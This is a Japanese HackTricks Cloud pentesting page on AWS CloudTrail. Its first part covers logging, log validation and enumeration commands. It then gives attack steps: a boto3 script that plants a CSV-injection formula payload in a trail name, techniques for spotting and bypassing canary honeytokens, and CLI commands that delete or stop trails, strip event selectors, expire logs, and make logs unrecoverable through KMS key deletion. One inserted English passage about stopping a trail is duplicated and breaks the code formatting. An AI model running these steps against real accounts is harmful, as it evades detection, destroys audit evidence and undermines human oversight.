# AWS - CloudTrail Enum

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **CloudTrail**

AWS CloudTrailは、AWS環境内のアクティビティを**記録し監視**します。AWSリソースとのすべての相互作用について、誰が何をいつどこから行ったかを含む詳細な**イベントログ**をキャプチャします。これにより、変更とアクションの監査トレイルが提供され、セキュリティ分析、コンプライアンス監査、リソース変更の追跡が支援されます。CloudTrailは、ユーザーとリソースの動作を理解し、セキュリティポジションを向上させ、規制の遵守を確保するために不可欠です。

各記録されたイベントには以下が含まれます：

* 呼び出されたAPIの名前：`eventName`
* 呼び出されたサービス：`eventSource`
* 時間：`eventTime`
* IPアドレス：`SourceIPAddress`
* エージェントメソッド：`userAgent`。例：
* Signing.amazonaws.com - AWS Management Consoleから
* console.amazonaws.com - アカウントのルートユーザー
* lambda.amazonaws.com - AWS Lambdaから
* リクエストパラメータ：`requestParameters`
* レスポンス要素：`responseElements`

イベントは、**約5分ごとにJSONファイルに新しいログファイルとして書き込まれ**、CloudTrailによって保持され、最終的にログファイルは**約15分後にS3に配信されます**。\
CloudTrailのログは、アカウント間およびリージョン間で**集約**することができます。\
CloudTrailは、ログファイルの整合性を使用して、CloudTrailがログファイルを配信した後もログファイルが変更されていないことを検証できるようにします。ログ内のログのSHA-256ハッシュを作成します。新しいログのSHA-256ハッシュは1時間ごとに作成されます。\
Trailを作成する際、イベントセレクタを使用して、ログするトレイル（管理、データ、洞察イベント）を指定できます。

ログはS3バケットに保存されます。デフォルトでは、サーバーサイド暗号化（SSE-S3）が使用されるため、AWSはアクセス権を持つ人々に対してコンテンツを復号化しますが、追加のセキュリティのためにSSE with KMSと独自のキーを使用することもできます。

### ログファイルの命名規則

![](<../../../../.gitbook/assets/image (29).png>)

### S3フォルダの構造

![](<../../../../.gitbook/assets/image (47).png>)

フォルダ "_AWSLogs_" と "_CloudTrail_" は固定のフォルダ名であることに注意してください。

**Digest** ファイルには、類似のフォルダパスがあります：

![](<../../../../.gitbook/assets/image (22).png>)

### 複数のアカウントからログを集約する

* ログファイルを配信するAWSアカウントでトレイルを作成します
* CloudTrailにクロスアカウントアクセスを許可し、アクセスが必要な各AWSアカウントに対して宛先S3バケットへのアクセス権限を適用します
* 他のAWSアカウントで新しいトレイルを作成し、ステップ1で作成したバケットを使用するように選択します

ただし、同じS3バケットにすべてのログを保存できる場合でも、複数のアカウントのCloudTrailログを単一のAWSアカウントに所属するCloudWatch Logsに集約することはできません。

### 組織のすべてのアカウントから1つにCloudTrailを作成する

CloudTrailを作成する際、組織のすべてのアカウントでCloudTrailをアクティブにし、ログを1つのバケットに取得することができます：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

これにより、すべてのアカウントのすべてのリージョンでCloudTrailを簡単に構成し、ログを1つのアカウントに集約することができます（保護する必要があります）。

### ログファイルのチェック

ログが改ざんされていないことを確認するには、次のコマンドを実行します。

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatchへのログの送信

**CloudTrailはログを自動的にCloudWatchに送信することができますので、不審なアクティビティが行われた際に警告を設定することができます。**\
CloudTrailがログをCloudWatchに送信するためには、そのアクションを許可するための**ロール**を作成する必要があります。可能であれば、これらのアクションを実行するためにAWSのデフォルトロールを使用することをお勧めします。このロールにより、CloudTrailは以下の操作を実行することができます。

* CreateLogStream：CloudWatch Logsのログストリームを作成することができます。
* PutLogEvents：CloudTrailのログをCloudWatch Logsのログストリームに配信することができます。

### イベント履歴

CloudTrailイベント履歴では、記録されたログをテーブルで確認することができます。

![](<../../../../.gitbook/assets/image (24).png>)

### インサイト

**CloudTrailインサイト**は、CloudTrailトレイルからの書き込み管理イベントを自動的に**分析**し、**異常なアクティビティ**について**警告**します。たとえば、確立されたベースラインと異なる`TerminateInstance`イベントの増加がある場合、それをインサイトイベントとして表示します。これにより、異常なAPIアクティビティの検出と対応がこれまで以上に容易になります。

### セキュリティ

| CloudTrailログファイルの整合性        | <ul><li>ログが改ざんされていないか（変更または削除されていないか）を検証します</li><li><p>ダイジェストファイルを使用します（各ファイルにハッシュを作成）</p><ul><li>SHA-256ハッシュ</li><li>デジタル署名用のSHA-256 with RSA</li><li>Amazonが所有する秘密鍵</li></ul></li><li>ダイジェストファイルの作成には1時間かかります（毎時の時間に実行されます）</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 不正アクセスの防止             | <ul><li><p>IAMポリシーとS3バケットポリシーを使用します</p><ul><li>セキュリティチーム —> 管理者アクセス</li><li>監査人 —> 読み取り専用アクセス</li></ul></li><li>ログを暗号化するためにSSE-S3/SSE-KMSを使用します</li></ul>                                                                                                                                        |
| ログファイルの削除防止 | <ul><li>IAMとバケットポリシーで削除アクセスを制限します</li><li>S3 MFA削除を構成します</li><li>ログファイルの検証を行います</li></ul>                                                                                                                                                                                            |

## アクション

### 列挙
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSVインジェクション**

CloudTrail内でCSVインジェクションを実行することが可能であり、ログがCSV形式でエクスポートされ、Excelで開かれた場合に任意のコードが実行される可能性があります。\
以下のコードは、ペイロードを含む不正なトレイル名を持つログエントリを生成します。
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
CSVインジェクションについての詳細は、次のページを参照してください：

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

この特定のテクニックについての詳細については、[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)を参照してください。

## **検出の回避**

### HoneyTokensのバイパス

HoneyTokensは、**機密情報の持ち出しを検出**するために作成されます。AWSの場合、**監視されるAWSキー**であり、そのキーを使用して何かがトリガーされると、誰かがそのキーを盗んだということになります。

ただし、この監視は**CloudTrail**を介して行われ、一部の**AWSサービスはログをCloudTrailに送信しない**場合があります（[ここでリストを見つける](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)）。これらのサービスのいくつかは、認可されていない人（HoneyTokenキー）がアクセスしようとすると、**キーロールのARNを含むエラー**を返します。

これにより、**攻撃者はログをトリガーせずにキーのARNを取得**することができます。ARNでは、攻撃者は**AWSアカウントIDと名前**を見ることができます。HoneyTokenの企業のアカウントIDと名前は簡単に特定できるため、攻撃者はトークンがHoneyTokenであるかどうかを特定できます。

![](<../../../../.gitbook/assets/image (65).png>)

#### HoneyTokensの検出

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)は、[**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**のキーを検出**します：

* キーロールの名前またはアカウントIDに**`canarytokens.org`**が表示される場合、またはエラーメッセージに**`534261010715`**が表示される場合。
* より最近のテストでは、アカウント**`717712589309`**を使用しており、名前に**`canarytokens.com`**の文字列がまだ含まれています。
* エラーメッセージのキーロールの名前に**`SpaceCrab`**が表示される場合
* **SpaceSiren**はユーザー名を生成するために**uuid**を使用します：`[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* **名前がランダムに生成されたように見える**場合、それはHoneyTokenである可能性が高いです。

{% hint style="danger" %}
CloudTrailログを作成しないことが判明したすべての公開APIは修正されましたので、独自のものを見つける必要があるかもしれません...
{% endhint %}

詳細については、[**オリジナルの研究**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)を参照してください。

### サードパーティのインフラへのアクセス

特定のAWSサービスは、**データベース**や**Kubernetes**クラスタ（EKS）などのインフラを**生成**します。ユーザーがこれらのサービスに直接アクセスする場合（DBポートまたはKubernetes API）、AWS APIは使用されないため、CloudTrailはこの通信を検出できません。

したがって、EKSへのアクセス権を持つユーザーがEKS APIのURLを発見し、トークンをローカルで生成し、CloudTrailに検出されずにAPIサービスと直接通信することができます。

詳細は次を参照してください：

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrailの設定の変更

#### トレイルの削除
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### トレイルの停止

```plaintext
To stop a trail, you can use the AWS Management Console, AWS CLI, or AWS SDKs.

Using the AWS Management Console:
1. Open the CloudTrail console.
2. In the navigation pane, choose Trails.
3. Select the trail that you want to stop.
4. Choose Actions, and then choose Stop logging.

Using the AWS CLI:
Run the following command:
```
```bash
aws cloudtrail stop-logging --name <trail-name>
```
```plaintext
Replace `<trail-name>` with the name of the trail that you want to stop.

Using AWS SDKs:
Refer to the documentation of the specific SDK you are using for instructions on how to stop a trail.
```

```plaintext
Note: When you stop a trail, CloudTrail stops logging events. However, the trail settings and configuration are retained. You can start the trail again at any time.
```

```plaintext
Stopping a trail is useful when you no longer need to capture events or want to temporarily pause logging.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### マルチリージョンのログ記録を無効にする

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### イベントセレクタによるログ記録の無効化

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

最初の例では、単一のイベントセレクタが単一のオブジェクトとしてJSON配列で提供されています。`"ReadWriteType": "ReadOnly"`は、**イベントセレクタが読み取り専用のイベントのみをキャプチャする**ことを示しています（たとえば、CloudTrailのインサイトは書き込みイベントをチェックしません）。

特定の要件に基づいてイベントセレクタをカスタマイズすることができます。

#### S3ライフサイクルポリシーによるログの削除

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### バケット構成の変更

* S3バケットを削除する
* バケットポリシーを変更して、CloudTrailサービスからの書き込みを拒否する
* S3バケットにライフサイクルポリシーを追加してオブジェクトを削除する
* CloudTrailログを暗号化するために使用されるKMSキーを無効にする

### Cloudtrailランサムウェア

#### S3ランサムウェア

**非対称キーを生成**し、**CloudTrailがそのキーでデータを暗号化**し、**プライベートキーを削除**することで、CloudTrailの内容を回復できなくすることができます。\
これは基本的には、以下で説明されている**S3-KMSランサムウェア**です。

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMSランサムウェア**

これは、異なる権限要件で前述の攻撃を実行するための簡単な方法です。

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **参考文献**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
